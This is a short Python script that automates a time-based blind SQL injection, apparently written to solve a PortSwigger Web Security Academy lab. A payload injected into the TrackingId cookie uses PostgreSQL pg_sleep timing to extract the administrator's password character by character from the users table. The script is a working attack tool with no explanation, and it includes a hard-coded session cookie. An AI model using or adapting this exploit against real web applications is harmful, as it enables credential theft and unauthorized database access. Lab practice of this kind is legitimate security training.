import requests as req
import string
import os
url = 'https://0ada00fc0485d8fe80675de2000c000f.web-security-academy.net/'
pwd = ''
printable_text = string.printable
print("Guessing Pass")
for i in range(1,21):
    for j in printable_text:
        cookies = {
            "TrackingId": f"uXFxj7mZGUfgm5V1'%3BSELECT CASE WHEN (SUBSTRING((select password from users where username='administrator'), {i}, 1)='{j}') THEN pg_sleep(7) ELSE pg_sleep(0) END--",
            "session": "TUO98co1YBh9f9Xh41p8E7g1YhmQl6xC"
            
        }
        try:
            res =  req.get(url, cookies=cookies, timeout=7)
            print(f"try {j}, res: {res.status_code}")
        except req.Timeout:
            pwd = pwd+j
            os.system('cls' if os.name == 'nt' else 'clear')
            print("Guessing Pass:")
            print("word found: ", pwd)
            break
            
print(pwd)